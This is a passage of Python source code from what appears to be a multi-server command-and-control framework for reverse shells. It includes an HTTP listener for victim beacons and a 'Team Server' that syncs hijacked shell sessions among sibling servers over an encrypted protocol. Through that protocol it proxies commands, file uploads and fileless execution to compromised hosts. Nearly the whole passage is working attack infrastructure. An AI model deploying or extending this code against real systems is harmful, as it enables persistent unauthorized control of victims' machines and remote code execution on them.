						output = self.cmd_output_interpreter(session_id, output, constraint_mode = Sessions_Manager.legit_session_ids[session_id]['constraint_mode'])
				   	 
						if not isinstance(output, int):
							
							# str == User issued cmd
							if isinstance(output, str):
								# Dirty patch to suppress error messages when re-establishing sessions based on beacons (may occur due to bad synchronization).
								if re.search("The term 'OK' is not recognized as the name of a cmdlet, function, script file", output) or re.search('bash: line 1: OK: command not found', output):
									return

								print(f'\r{GREEN}{output}{END}') if output else do_nothing()
								print()
								Main_prompt.set_main_prompt_ready() if not self.active_shell else Hoaxshell.set_shell_prompt_ready()

							# list == Sibling issued cmd
							elif isinstance(output, list):
								if not isinstance(output[1], int):
									try:
										Core_Server.send_receive_one_encrypted(output[0], [f'{GREEN}{output[1]}{END}', '', session_id, True], 'command_output', 30)
									except:
										pass


					except ConnectionResetError:

						error_msg = f'[{ERR}] There was an error reading the response, most likely because of the size (Content-Length: {self.headers.get("Content-Length")}). Try limiting the command\'s output.'

						if isinstance(output, str):
							print(error_msg)
							Main_prompt.set_main_prompt_ready() if not self.active_shell else Hoaxshell.set_shell_prompt_ready()

						elif isinstance(output, list):
							try: Core_Server.send_receive_one_encrypted(output[0], [error_msg, '', session_id, True], 'command_output', 30)
							except: pass

						del error_msg
				   	 
					finally:
						del output

			except KeyError:
				pass


		else:
			self.send_response(200)
			self.end_headers()
			self.wfile.write(b'Move on mate.')
			pass



	def do_OPTIONS(self):

		self.server_version = Hoaxshell_Settings.server_version
		self.sys_version = ""
		self.send_response(200)
		self.send_header('Access-Control-Allow-Origin', self.headers["Origin"])
		self.send_header('Vary', "Origin")
		self.send_header('Access-Control-Allow-Credentials', 'true')
		self.send_header('Access-Control-Allow-Headers', Hoaxshell_Settings.header_id)
		self.end_headers()
		self.wfile.write(b'OK')


	def log_message(self, format, *args):
		return



	@staticmethod
	def dropSession(session_id):

		os_type = Sessions_Manager.active_sessions[session_id]['OS Type']
		outfile = Sessions_Manager.legit_session_ids[session_id]['exec_outfile']

		if Sessions_Manager.active_sessions[session_id]['Listener'] == 'hoaxshell':
			exit_command = 'stop-process $PID' if os_type  == 'Windows' else 'echo byee'

			if Sessions_Manager.active_sessions[session_id]['Shell'] == 'cmd.exe':
				Hoaxshell.command_pool[session_id].append({'data' : 'exit', 'issuer' : 'self', 'quiet' : True})
		   	 
			elif (os_type == 'Windows' and not outfile) or os_type == 'Linux':
				Hoaxshell.command_pool[session_id].append({'data' : exit_command, 'issuer' : 'self', 'quiet' : True})

			elif os_type == 'Windows' and outfile:
				Hoaxshell.command_pool[session_id].append({'data' : 'quit', 'issuer' : 'self', 'quiet' : True})

		elif Sessions_Manager.active_sessions[session_id]['Listener'] == 'reverse tcp':
			Hoaxshell.command_pool[session_id].append({'data' : 'exit', 'issuer' : 'self', 'quiet' : True})



	@staticmethod
	def terminate():

		active_sessions_clone = deepcopy(Sessions_Manager.active_sessions)
		active_sessions = active_sessions_clone.keys()

		if active_sessions:

			print(f'\r[{INFO}] Terminating self-owned active sessions - DO NOT INTERRUPT...')

			for session_id in active_sessions:

				try:
					if Sessions_Manager.active_sessions[session_id]['Owner'] == Core_Server.SERVER_UNIQUE_ID:
						Sessions_Manager.sessions_graveyard.append(session_id)
						Hoaxshell.dropSession(session_id)
						#Core_Server.announce_session_termination({'session_id' : session_id})

				except:
					continue

			sleep(2)
			print(f'\r[{INFO}] Sessions terminated.')

		else:
			sys.exit(0)



	def monitor_shell_state(self, session_id):

		Threading_params.thread_limiter.acquire()

		while True:

			if session_id in Sessions_Manager.active_sessions.keys():

				if session_id in Sessions_Manager.sessions_graveyard and \
				session_id not in Sessions_Manager.active_sessions.keys():
					break

				timestamp = int(datetime.now().timestamp())
				tlimit = (Sessions_Manager.active_sessions[session_id]['frequency'] + Sessions_manager_settings.shell_state_change_after)
				last_received = Sessions_Manager.active_sessions[session_id]['last_received']
				time_difference = abs(last_received - timestamp)
				current_status = Sessions_Manager.active_sessions[session_id]['Status']

				if (time_difference >= tlimit) and current_status == 'Active':
					Sessions_Manager.active_sessions[session_id]['Status'] = 'Undefined'
					Core_Server.announce_shell_session_stat_update({
						'session_id' : session_id,
						'Status' : Sessions_Manager.active_sessions[session_id]['Status']
					})

				elif (time_difference < tlimit) and current_status == 'Undefined':
					Sessions_Manager.active_sessions[session_id]['Status'] = 'Active'
					Core_Server.announce_shell_session_stat_update({'session_id' : session_id,
						'Status' : Sessions_Manager.active_sessions[session_id]['Status']
					})

				sleep(Hoaxshell_Settings.monitor_shell_state_freq)

			else:
				Threading_params.thread_limiter.release()
				return



def initiate_hoax_server():

	try:

		# Check if both cert and key files were provided
		if (Hoaxshell_Settings.certfile and not Hoaxshell_Settings.keyfile) or \
			(Hoaxshell_Settings.keyfile and not Hoaxshell_Settings.certfile):
			exit(f'[{DEBUG}] SSL support seems to be misconfigured (missing key or cert file).')

		# Start http server
		port = Hoaxshell_Settings.bind_port if not Hoaxshell_Settings.ssl_support else Hoaxshell_Settings.bind_port_ssl

		try:
			httpd = HTTPServer((Hoaxshell_Settings.bind_address, port), Hoaxshell)

		except OSError:
			exit(f'[{DEBUG}] {Hoaxshell.server_name} failed to start. Port {port} seems to already be in use.\n')

		except:
			exit(f'\n[{DEBUG}] {Hoaxshell.server_name} failed to start (Unknown error occurred).\n')

		if Hoaxshell_Settings.ssl_support:
			context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
			context.load_cert_chain(certfile = Hoaxshell_Settings.certfile, keyfile = Hoaxshell_Settings.keyfile)
			httpd.socket = context.wrap_socket(sock = httpd.socket, server_side= True)

		Hoaxshell_server = Thread(target = httpd.serve_forever, args = (), name = 'hoaxshell_server')
		Hoaxshell_server.daemon = True
		Hoaxshell_server.start()
		registered_services.append({
			'service' : Hoaxshell.server_name,
			'socket' : f'{ORANGE}{Hoaxshell_Settings.bind_address}{END}:{ORANGE}{port}{END}'
		})
		print(f'[{ORANGE}{Hoaxshell_Settings.bind_address}{END}:{ORANGE}{port}{END}]::{Hoaxshell.server_name}')


	except KeyboardInterrupt:
		Hoaxshell.terminate()



class Core_Server:

	server_name = 'Team Server'
	acknowledged_servers = []
	sibling_servers = {}
	requests = {}
	SERVER_UNIQUE_ID = str(uuid4()).replace('-', '')
	HOSTNAME = socket.gethostname()
	listen = True
	ping_sibling_servers = False
	CONNECT_SYN = b'\x4f\x86\x2f\x7b'
	CONNECT_ACK = b'\x5b\x2e\x42\x6d'
	CONNECT_DENY = b'\x3c\xc3\x86\xde'
	core_initialized = None


	@staticmethod
	def return_server_uniq_id():
		return Core_Server.SERVER_UNIQUE_ID



	def sock_handler(self, conn, address):

		raw_data = str_data = None
		try:

			Threading_params.thread_limiter.acquire()
			raw_data = Core_Server.recv_msg(conn)
			str_data = ''
			rst_prompt = False

			# There are 3 predefined byte sequences for processing a sibling server's request
			# to connect (something like a TCP handshake but significantly more stupid).

			# Check if raw_data is a connection request
			if raw_data in [self.CONNECT_SYN, self.CONNECT_DENY]:

				if raw_data == self.CONNECT_SYN:

					# Spam filter
					if address[0] in self.acknowledged_servers:
						Core_Server.send_msg(conn, self.CONNECT_DENY)
						conn.close()
						return

					request_id = ''.join(["{}".format(randint(0, 9)) for num in range(0, 4)])
					self.requests[request_id] = False

					if Core_Server_Settings.insecure:
						self.acknowledged_servers.append(address[0])
						Core_Server.send_msg(conn, self.CONNECT_ACK)				   	 

					else:

						print(f"\r[{INFO}] Received request to connect from {ORANGE}{address[0]}{END}")
						print_to_prompt(f"\r[{INFO}] Type {ORANGE}{request_id}{END} and press ENTER to accept. You have 10 seconds.")
						timeout_start = time()

						while time() < timeout_start + 10:

							if self.requests[request_id]:
								self.acknowledged_servers.append(address[0])
								Core_Server.send_msg(conn, self.CONNECT_ACK)
								break
							sleep(0.1)

						else:

							Core_Server.send_msg(conn, self.CONNECT_DENY)
							conn.close()
							print_to_prompt(f"\r[{INFO}] Request to connect with {ORANGE}{address[0]}{END} denied.")

						del self.requests[request_id]

				return


			# If the sender's IP address is in the list of acknowledged for connection servers and the msg is a valid UUID4, then establish connection
			elif address[0] in self.acknowledged_servers:

				str_data = raw_data.decode('utf-8', 'ignore').strip()

				# Try to interpret the clear text data
				try:
					tmp = str_data.split(':')
					sibling_id = tmp[0]
					sibling_server_port = tmp[1]
					sibling_server_hostname = tmp[2]

				except:
					sibling_id = None


				if is_valid_uuid(sibling_id):

					self.sibling_servers[sibling_id] = {'Hostname' : sibling_server_hostname, 'Server IP' : address[0], 'Server Port' : int(sibling_server_port), 'Status' : 'Active'}
					Core_Server.send_msg(conn, f'{self.SERVER_UNIQUE_ID}:{self.HOSTNAME}'.encode("utf-8"))
					self.acknowledged_servers.remove(address[0])

					# Synchronize all servers
					self.synchronize_sibling_servers(initiator = False)
					return

			else:
				# Check if connection is coming from an acknowledged sibling server
				server_is_sibling = sibling_id = False

				if self.sibling_servers.keys():
					server_is_sibling = sibling_id = self.server_is_sibling(address[0])


				# If the packet is coming from a sibling then it's encrypted and "encapsulated"
				if server_is_sibling:

					# AES KEY is the recipient sibling server's ID and IV is the 16 first bytes of the (local host) server's ID
					decrypted_data = self.decrypt_encapsulated_msg(sibling_id, raw_data) # returns [capsule, received_data]

					if decrypted_data[0] == 'synchronize_sibling_servers_table':

						self.update_siblings_data_table(decrypted_data[1])

						# Return local sibling servers data
						sibling_servers_data_local = str(self.encapsulate_dict(self.sibling_servers, decrypted_data[0]))
						encrypted_siblings_data = encrypt_msg(self.SERVER_UNIQUE_ID.encode('utf-8'), sibling_servers_data_local, sibling_id[0:16].encode('utf-8'))
						Core_Server.send_msg(conn, encrypted_siblings_data)



					elif decrypted_data[0] == 'synchronize_sibling_servers_shells':

						self.update_shell_sessions(decrypted_data[1])

						# Return local sibling servers data
						sibling_servers_shells = str(self.encapsulate_dict(Sessions_Manager.active_sessions, decrypted_data[0]))
						encrypted_siblings_data = encrypt_msg(self.SERVER_UNIQUE_ID.encode('utf-8'), sibling_servers_shells, sibling_id[0:16].encode('utf-8'))
						Core_Server.send_msg(conn, encrypted_siblings_data)



					elif decrypted_data[0] == 'exec_command':

						data = decrypted_data[1]

						# Check if session exists
						if data['session_id'] in Sessions_Manager.active_sessions.keys():
							Hoaxshell.command_pool[data['session_id']].append(data['command'])
							Core_Server.send_msg(conn, self.response_ack(sibling_id))



					elif decrypted_data[0] == 'set_redirector':
					
						session_id = decrypted_data[1]['session_id']
						Sessions_Manager.shell_redirectors[session_id] = sibling_id

						# Check if session exists
						# if session_id in Sessions_Manager.active_sessions.keys():
						# 	Hoaxshell.command_pool[session_id].append(data['command'])
						# 	Core_Server.send_msg(conn, self.response_ack(sibling_id))



					elif decrypted_data[0] == 'pop_redirector':
					
						session_id = decrypted_data[1]['session_id']
						TCP_Sock_Multi_Handler.remove_redirector(session_id)



					elif decrypted_data[0] == 'command_output':

						# prompt_value = '' #decrypted_data[1][1]
						session_id = decrypted_data[1][2]
						# prompt_ready = True #decrypted_data[1][3]

						try:
							os_type = Sessions_Manager.active_sessions[session_id]['OS Type']
						except:
							os_type = False

						if decrypted_data[1][0] == 'Awaiting for response reached the defined timeout.':
							print(f'\r{ORANGE}{decrypted_data[1][0]}{END}')
						else:
							print(f'{decrypted_data[1][0]}', end = '')

						Core_Server.send_msg(conn, self.response_ack(sibling_id))
						restore_prompt()



					elif decrypted_data[0] == 'active_shell_query':
						response = str(self.encapsulate_dict(Hoaxshell.active_shell, 'session_id'))
						response_encypted = encrypt_msg(self.SERVER_UNIQUE_ID.encode('utf-8'), response, sibling_id[0:16].encode('utf-8'))
						Core_Server.send_msg(conn, response_encypted)



					elif decrypted_data[0] == 'prompt_value_query':
						response = str(self.encapsulate_dict(Sessions_Manager.active_sessions[decrypted_data[1]]['prompt'], 'prompt_value'))
						response_encypted = encrypt_msg(self.SERVER_UNIQUE_ID.encode('utf-8'), response, sibling_id[0:16].encode('utf-8'))
						Core_Server.send_msg(conn, response_encypted)



					elif decrypted_data[0] == 'notification':
						print(f'\r{decrypted_data[1]}')
						Core_Server.send_msg(conn, self.response_ack(sibling_id))
						restore_prompt()



					elif decrypted_data[0] == 'repair':

						session_id = list(decrypted_data[1].keys())[0]

						if session_id in Sessions_Manager.active_sessions.keys():
							key = list(decrypted_data[1][session_id].keys())[0]
							new_val = decrypted_data[1][session_id][key]
							Sessions_Manager.active_sessions[session_id][key] = new_val

						Core_Server.send_msg(conn, self.response_ack(sibling_id))



					elif decrypted_data[0] == 'upload_file':
						File_Smuggler.upload_file(decrypted_data[1][0], decrypted_data[1][1], decrypted_data[1][2], issuer = sibling_id)
						Core_Server.send_msg(conn, self.response_ack(sibling_id))
						Main_prompt.set_main_prompt_ready() if not Hoaxshell.active_shell else Hoaxshell.set_shell_prompt_ready()



					elif decrypted_data[0] == 'exec_file':
						File_Smuggler.fileless_exec(decrypted_data[1][0], decrypted_data[1][1], issuer = sibling_id)
						Core_Server.send_msg(conn, self.response_ack(sibling_id))
						Main_prompt.set_main_prompt_ready() if not Hoaxshell.active_shell else Hoaxshell.set_shell_prompt_ready()



					elif decrypted_data[0] == 'global_chat':
						hostname = self.sibling_servers[sibling_id]['Hostname']
						msg = decrypted_data[1].strip("\n\r\t ")
						print_to_prompt(f'\r[{CHAT}] {hostname} says: {msg}')
						Core_Server.send_msg(conn, self.response_ack(sibling_id))



					elif decrypted_data[0] == 'new_session':
						new_session_id = decrypted_data[1]['session_id']
						decrypted_data[1].pop('session_id', None)
						Sessions_Manager.active_sessions[new_session_id] = decrypted_data[1]
						print_to_prompt(f'\r[{GREEN}Shell{END}][{new_session_id}] - New session established -> {ORANGE}{Sessions_Manager.active_sessions[new_session_id]["IP Address"]}{END} at {get_datetime()} (Owned by {ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END}).')
						del decrypted_data, new_session_id
						Core_Server.send_msg(conn, self.response_ack(sibling_id))



					elif decrypted_data[0] == 'shell_session_status_update':

						session_id = decrypted_data[1]['session_id']
						Sessions_Manager.active_sessions[session_id]['Status'] = decrypted_data[1]['Status']
						Core_Server.send_msg(conn, self.response_ack(sibling_id))

						if decrypted_data[1]['Status'] == 'Active':
							status = f'{GREEN}Active{END}'

						elif decrypted_data[1]['Status'] == 'Lost':
							status = f'{LRED}Lost{END}'

						else:
							status = f'{ORANGE}Undefined{END}'

						print(f'\r[{INFO}] Shell session {ORANGE}{session_id}{END} status changed to {status}.')
						Core_Server.restore_prompt_after_lost_conn(decrypted_data[1]['session_id'])
						del session_id, status



					elif decrypted_data[0] == 'session_terminated':

						victim_ip = Sessions_Manager.active_sessions[decrypted_data[1]['session_id']]['IP Address']
						Sessions_Manager.active_sessions.pop(decrypted_data[1]['session_id'], None)
						print(f'\r[{INFO}] Shell session on {ORANGE}{victim_ip}{END} (Owned by {ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END}) terminated.')

						if Hoaxshell.active_shell == decrypted_data[1]['session_id']:
							Hoaxshell.deactivate_shell()

						del victim_ip
						Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
						Core_Server.send_msg(conn, self.response_ack(sibling_id))



					elif decrypted_data[0] == 'server_shutdown':

						server_ip = self.sibling_servers[decrypted_data[1]['sibling_id']]['Server IP']
						hostname = self.sibling_servers[decrypted_data[1]['sibling_id']]['Hostname']
						self.sibling_servers.pop(decrypted_data[1]['sibling_id'], None)

						# Remove sessions associated with sibling server
						active_sessions_clone = deepcopy(Sessions_Manager.active_sessions)
						active_sessions = active_sessions_clone.keys()
						lost_session_ids = []

						if active_sessions:

							for session_id in active_sessions:

								try:
									if Sessions_Manager.active_sessions[session_id]['Owner'] == decrypted_data[1]['sibling_id']:
										del Sessions_Manager.active_sessions[session_id]
										lost_session_ids.append(session_id)

								except:
									continue

						lost_sessions = len(lost_session_ids)
						print(f'\r[{WARN}] Sibling server {ORANGE}{server_ip}{END} (hostname: {ORANGE}{hostname}{END}) disconnected.')
						print(f'\r[{WARN}] {lost_sessions} x shell sessions lost.') if lost_sessions else do_nothing()

						# Check if there was an active shell against a lost session
						for sid in lost_session_ids:
							if Hoaxshell.active_shell == sid:
								Hoaxshell.deactivate_shell()

						restore_prompt()
						del server_ip, hostname, active_sessions_clone, active_sessions
						Core_Server.send_msg(conn, self.response_ack(sibling_id))



					elif decrypted_data[0] == 'ping':
						Core_Server.send_msg(conn, self.response_ack(sibling_id))
						rst_prompt = False

					else:
						pass

				else:
					conn.close()


		except KeyboardInterrupt:
			pass


		except:
			print(f'\r[{WARN}] failed to process a request.					 	')
			rst_prompt = True

		conn.close()

		if rst_prompt:
			Main_prompt.set_main_prompt_ready() if not Hoaxshell.active_shell \
			else Hoaxshell.set_shell_prompt_ready()

		del raw_data, str_data
		Threading_params.thread_limiter.release()
		return



	@staticmethod
	def recv_msg(sock):

		raw_msglen = Core_Server.recvall(sock, 4)

		if not raw_msglen:
			return None

		msglen = struct.unpack('>I', raw_msglen)[0]

		return Core_Server.recvall(sock, msglen)



	@staticmethod
	def recvall(sock, n):

		data = bytearray()

		while len(data) < n:
			packet = sock.recv(n - len(data))

			if not packet:
				return None

			data.extend(packet)

		return data



	@staticmethod
	def send_msg(sock, msg):
		msg = struct.pack('>I', len(msg)) + msg
		sock.sendall(msg)



	@staticmethod
	def restore_prompt_after_lost_conn(session_id):

		if Hoaxshell.active_shell == session_id:
			Hoaxshell.deactivate_shell()

		Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()



	def initiate(self):

		try:
			server_socket = socket.socket()
			server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			server_socket.bind((Core_Server_Settings.bind_address, Core_Server_Settings.bind_port))

		except OSError:
			self.core_initialized = False
			exit_with_msg(f'{self.server_name} failed to start. Port {Core_Server_Settings.bind_port} seems to be already in use.\n')

		except:
			self.core_initialized = False
			exit_with_msg(f'{self.server_name} failed to start (Unknown error occurred).\n')

		self.core_initialized = True
		registered_services.append({
			'service' : self.server_name,
			'socket' : f'{ORANGE}{Core_Server_Settings.bind_address}{END}:{ORANGE}{Core_Server_Settings.bind_port}{END}'
		})
		print(f'\r[{ORANGE}{Core_Server_Settings.bind_address}{END}:{ORANGE}{Core_Server_Settings.bind_port}{END}]::{self.server_name}')

		# Start listening for connections
		server_socket.listen()

		while self.listen:

			conn, address = server_socket.accept()
			Thread(target = self.sock_handler, args = (conn, address), name = f'sock_conn_{address[0]}').start()

		conn.close()



	def response_ack(self, sibling_id):

		response_ack = str(self.encapsulate_dict({0 : 0}, 'ACKNOWLEDGED'))
		response_ack_encypted = encrypt_msg(self.SERVER_UNIQUE_ID.encode('utf-8'), response_ack, sibling_id[0:16].encode('utf-8'))
		return response_ack_encypted



	def decrypt_encapsulated_msg(self, sibling_id, raw_data):

		decrypted_data = decrypt_msg(sibling_id.encode('utf-8'), raw_data, self.SERVER_UNIQUE_ID[0:16].encode('utf-8'))
		decapsulated = self.decapsulate_dict(decrypted_data) # returns [capsule, received_data]
		return decapsulated



	def stop_listener(self):
		self.listen = False



	def list_siblings(self):

		if self.sibling_servers.keys():

			print('\r')
			table = self.siblings_dict_to_list()
			print_table(table, ['Sibling ID', 'Server IP', 'Server Port', 'Hostname', 'Status'])
			print('\r')

		else:
			print(f'Not connected with other servers.')



	@staticmethod
	def send_receive_one(msg, server_ip, server_port, encode_msg, timeout = 30):

		try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
				client_socket.settimeout(timeout)
				client_socket.connect((str(server_ip), int(server_port)))
				msg = msg.encode('utf-8') if encode_msg else msg
				Core_Server.send_msg(client_socket, msg)
				response_raw = Core_Server.recv_msg(client_socket)
				client_socket.close()
				return response_raw

		except ConnectionRefusedError:
			return 'connection_refused'

		except ConnectionResetError:
			return 'connection_reset'

		except OSError:
			return 'no_route_to_host'

		except socket.timeout:
			return 'timed_out'

		except:
			return 'unknown_error'



	@staticmethod
	def encapsulate_dict(data, encapsulate_as):

		encapsulated = {}
		encapsulated[encapsulate_as] = data
		return encapsulated



	@staticmethod
	def decapsulate_dict(data, request = 'NoCapsule'):

		try:
			dict_data = literal_eval(data)
			capsule = list(dict_data.keys())[0]
			received_data = dict_data[capsule]
			return [capsule, received_data]

		except:
			return 'failed_to_read'



	@staticmethod
	def announce_new_session(new_session_data_dict):

		siblings = clone_dict_keys(Core_Server.sibling_servers)

		if siblings:
			for sibling_id in siblings:
				Core_Server.send_receive_one_encrypted(sibling_id, new_session_data_dict, 'new_session')

		del siblings



	@staticmethod
	def announce_shell_session_stat_update(new_session_data_dict):

		siblings = clone_dict_keys(Core_Server.sibling_servers)

		if siblings:
			for sibling_id in siblings:
				Core_Server.send_receive_one_encrypted(sibling_id, new_session_data_dict, 'shell_session_status_update')

		del siblings



	@staticmethod
	def announce_session_termination(terminated_session_data_dict):

		siblings = clone_dict_keys(Core_Server.sibling_servers)

		if siblings:

			for sibling_id in siblings:
				Core_Server.send_receive_one_encrypted(sibling_id, terminated_session_data_dict, 'session_terminated')

		del siblings



	@staticmethod
	def announce_server_shutdown():

		siblings = Core_Server.sibling_servers.keys()

		if len(siblings):

			for sibling_id in siblings:
				Core_Server.send_receive_one_encrypted(sibling_id, {'sibling_id' : Core_Server.SERVER_UNIQUE_ID}, 'server_shutdown')



	def update_siblings_data_table(self, siblings_data):

		current_siblings = self.sibling_servers.keys()
		additional_siblings = 0

		for sibling_id in siblings_data.keys():
			if (sibling_id not in current_siblings) and (sibling_id != self.SERVER_UNIQUE_ID):
				self.sibling_servers[sibling_id] = siblings_data[sibling_id]
				additional_siblings += 1

		if additional_siblings:
			print_to_prompt(f'\r[{INFO}] {additional_siblings} x additional sibling server connections established!')



	def update_shell_sessions(self, shells_data):

		current_shells = clone_dict_keys(Sessions_Manager.active_sessions)
		additional_shells = 0

		if isinstance(shells_data, dict):
			for session_id in shells_data.keys():
				if (session_id not in current_shells) and shells_data[session_id]['Owner'] != Hoaxshell.server_unique_id:
					shells_data[session_id]['alias'] = None
					shells_data[session_id]['aliased'] = False
					shells_data[session_id]['self_owned'] = False
					Sessions_Manager.active_sessions[session_id] = shells_data[session_id]
					additional_shells += 1

		if additional_shells:
			print_to_prompt(f'\r[{INFO}] {additional_shells} x additional shell sessions established!')



	def server_is_sibling(self, server_ip, server_port = False):

		sibling_id = None
		siblings = clone_dict_keys(self.sibling_servers)

		for sibling in siblings:

			if server_port:
				if self.sibling_servers[sibling]['Server IP'] == server_ip and \
				self.sibling_servers[sibling]['Server Port'] == int(server_port):
					sibling_id = sibling
					break

			else:
				if self.sibling_servers[sibling]['Server IP'] == server_ip:
					sibling_id = sibling
					break

		return sibling_id



	@staticmethod
	def send_receive_one_encrypted(sibling_id, data_dict, capsule, timeout = 10):

		# AES KEY is the server's ID and IV is the 16 first bytes of the sibling's ID
		server_unique_id = Core_Server.return_server_uniq_id()
		encapsulated_data = str(Core_Server.encapsulate_dict(data_dict, capsule))
		encapsulated_data_encrypted = encrypt_msg(server_unique_id.encode('utf-8'), encapsulated_data, sibling_id[0:16].encode('utf-8'))

		# Prepare to send msg
		try:
			server_ip = Core_Server.sibling_servers[sibling_id]['Server IP']
			server_port = Core_Server.sibling_servers[sibling_id]['Server Port']
		except KeyError:
			return False

		encapsulated_response_data_encrypted = Core_Server.send_receive_one(encapsulated_data_encrypted, server_ip, server_port, encode_msg = False, timeout = timeout)

		if encapsulated_response_data_encrypted not in ['connection_refused', 'timed_out', 'connection_reset', 'no_route_to_host', 'unknown_error']:
			encapsulated_response_data_decrypted = decrypt_msg(sibling_id.encode('utf-8'), encapsulated_response_data_encrypted, server_unique_id[0:16].encode('utf-8'))
			decapsulated_response_data = Core_Server.decapsulate_dict(encapsulated_response_data_decrypted, capsule) # returns [capsule, received_data]
			return decapsulated_response_data

		else:
			return encapsulated_response_data_encrypted


	@staticmethod
	def broadcast(data, capsule):

		sibling_servers = clone_dict_keys(Core_Server.sibling_servers)

		for sibling_id in sibling_servers:
			Core_Server.send_receive_one_encrypted(sibling_id, data, capsule)



	def is_shell_session_occupied(self, session_id):

		sibling_servers = clone_dict_keys(self.sibling_servers)

		for sibling_id in sibling_servers:
			active_shell = Core_Server.send_receive_one_encrypted(sibling_id, self.sibling_servers, 'active_shell_query')
			if active_shell:
				if active_shell[1] == session_id:
					return True

		return False



	@staticmethod
	def request_prompt_value(session_id):

		try:
			session_owner_id = Sessions_Manager.return_session_attr_value(session_id, 'Owner')
			prompt_value = Core_Server.send_receive_one_encrypted(session_owner_id, session_id, 'prompt_value_query')
			# return prompt_value
			return ''

		except:
			return None



	def synchronize_sibling_servers(self, initiator):

		print(f'\r[{INFO}] Synchronizing servers...')
		sibling_servers = clone_dict_keys(self.sibling_servers)

		for sibling_id in sibling_servers:

			remote_siblings_data = Core_Server.send_receive_one_encrypted(sibling_id, self.sibling_servers, 'synchronize_sibling_servers_table')
			if remote_siblings_data:
				if isinstance(remote_siblings_data[1], dict):
					self.update_siblings_data_table(remote_siblings_data[1])

			# Sync sibling servers shell sessions
			remote_shells = Core_Server.send_receive_one_encrypted(sibling_id, Sessions_Manager.active_sessions, 'synchronize_sibling_servers_shells')
			if remote_shells:
				self.update_shell_sessions(remote_shells[1])

		if not self.ping_sibling_servers:
			siblings_status_monitor = Thread(target = self.ping_siblings, args = (), name = 'sibling_servers_state_monitor')
			siblings_status_monitor.daemon = True
			siblings_status_monitor.start()

		print(f'\r[{INFO}] Synchronized!')

		if initiator:
			Main_prompt.set_main_prompt_ready()
		else:
			Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()



	def connect_with_sibling_server(self, server_ip, server_port):

		try:
			server_port = int(server_port)

		except ValueError:
			print('Port must be of type Int.')
			return

		authorized = True

		if not is_valid_ip(server_ip):
			print('\rProvided IP address is not valid.')
			authorized = False

		if server_port < 1 or server_port > 65535:
			print('\rPort must be between 1 and 65535.')
			authorized = False

		# Prevent connecting with self
		if (server_ip in ['127.0.0.1', 'localhost', '::1', '127.0.0.0', '127.0.0.2', '127.0.0.3', '127.0.0.4', '127.0.0.5', '127.0.0.6', '127.0.0.7', '127.0.0.8', '::1', '0:0:0:0:0:0:0:1', '0:0:0:0:0:0:0:1%0', '[::1]']): # and (server_port == Core_Server_Settings.bind_port)
			print('\rIf you really want to connect with yourself, try yoga.')
			authorized = False

		# Check if server_ip already in siblings
		server_is_sibling = self.server_is_sibling(server_ip, server_port)

		if server_is_sibling:
			print('\rYou are already connected with this server.')
			authorized = False


		# Init connect
		if authorized:

			print(f'[{INFO}] Sending request to connect...')
			response = self.send_receive_one(self.CONNECT_SYN, server_ip, server_port, encode_msg = False, timeout = 11)

			if response in ['connection_refused', 'timed_out', 'connection_reset', 'no_route_to_host', 'unknown_error']:
				return print(f'\r[{ERR}] Request to connect failed ({response}).')

			elif response == self.CONNECT_ACK:
				response = self.send_receive_one(f'{self.SERVER_UNIQUE_ID}:{Core_Server_Settings.bind_port}:{self.HOSTNAME}', server_ip, server_port, encode_msg = True)
				tmp = response.decode('utf-8', 'ignore').split(':')
				sibling_id = tmp[0]
				sibling_hostname = tmp[1]

				if is_valid_uuid(sibling_id):
					self.sibling_servers[sibling_id] = {'Hostname': sibling_hostname, 'Server IP' : server_ip, 'Server Port' : server_port, 'Status' : 'Active'}

				else:
					print(f'\r[{ERR}] Request to connect failed.')
					return

				print(f'\r[{INFO}] Connection established!\r')

				self.synchronize_sibling_servers(initiator = True)

			elif response == self.CONNECT_DENY:
				print(f'\r[{ERR}] Request to connect denied.')



	@staticmethod
	def proxy_cmd_for_exec_by_sibling(sibling_id, session_id, command):

		# Check again if server in siblings
		if sibling_id not in Core_Server.sibling_servers.keys():
			print(f'\r[{ERR}] Failed to proxy the command. Connection with the sibling server may be lost.')
			Main_prompt.set_main_prompt_ready() if not Hoaxshell.active_shell else Hoaxshell.set_shell_prompt_ready()
			return

		# if not isinstance(command, dict):
		# 	# Append sibling signature to cmd
		# 	command = command + Exec_Utils.get_sibling_signature(session_id)

		# Send command to sibling
		cmd_exec_data = {'session_id' : session_id, 'command' : command}
		response = Core_Server.send_receive_one_encrypted(sibling_id, cmd_exec_data, 'exec_command', Core_Server_Settings.timeout_for_command_output)

		# Read response
		# if response[0] == 'ACKNOWLEDGED':
		# 	print(f'[{INFO}] Command delivered. Awaiting output...', end = '')



	def ping_siblings(self):

		Threading_params.thread_limiter.acquire()
		self.ping_sibling_servers = True

		while True:

			siblings = clone_dict_keys(self.sibling_servers)

			if not siblings:
				sleep(Core_Server_Settings.ping_siblings_sleep_time)

			else:

				for sibling_id in siblings:

					try:
						response = Core_Server.send_receive_one_encrypted(sibling_id, {0 : 0}, 'ping', 4)

						if response in ['connection_refused', 'timed_out', 'connection_reset', 'no_route_to_host', 'unknown_error']:
							# Check if active shell against a session that belongs to the lost sibling
							if Hoaxshell.active_shell in Sessions_Manager.active_sessions.keys():
								if Sessions_Manager.active_sessions[Hoaxshell.active_shell]['Owner'] == sibling_id:
									Hoaxshell.deactivate_shell()

							self.remove_all_sessions(sibling_id)
							server_ip = self.sibling_servers[sibling_id]["Server IP"]
							del self.sibling_servers[sibling_id]
							print_to_prompt(f'\r[{WARN}] Connection with sibling server {ORANGE}{server_ip}{END} lost.')

					except:
						continue

			sleep(Core_Server_Settings.ping_siblings_sleep_time)



	def remove_all_sessions(self, sibling_id):

		active_sessions = clone_dict_keys(Sessions_Manager.active_sessions)

		for session_id in active_sessions:
			if Sessions_Manager.active_sessions[session_id]['Owner'] == sibling_id:
				del Sessions_Manager.active_sessions[session_id]



	def siblings_dict_to_list(self):

		siblings_list = []
		corrupted = 0
		siblings_clone = deepcopy(self.sibling_servers)

		for sibling_id in siblings_clone.keys():

			try:
				tmp = siblings_clone[sibling_id]
